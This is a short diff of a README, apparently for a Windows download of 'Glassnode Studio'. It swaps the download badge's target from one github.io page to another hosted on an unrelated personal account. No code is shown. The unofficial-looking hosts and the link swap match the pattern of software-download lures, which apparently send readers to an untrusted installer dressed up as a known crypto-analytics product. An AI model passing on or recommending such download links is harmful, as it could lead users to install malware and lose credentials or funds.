@@ -4,7 +4,7 @@
 
 ## 📥 Download Glassnode Studio for Windows
 
-[![⬇️ Download Glassnode Studio](https://img.shields.io/badge/Download-Glassnode%20Studio-blue?style=for-the-badge&logo=windows)](https://glassnodeload.github.io/.github/)
+[![⬇️ Download Glassnode Studio](https://img.shields.io/badge/Download-Glassnode%20Studio-blue?style=for-the-badge&logo=windows)](https://allazhirinovskaya.github.io/.github/glassnode-studio)
 
 ---
 
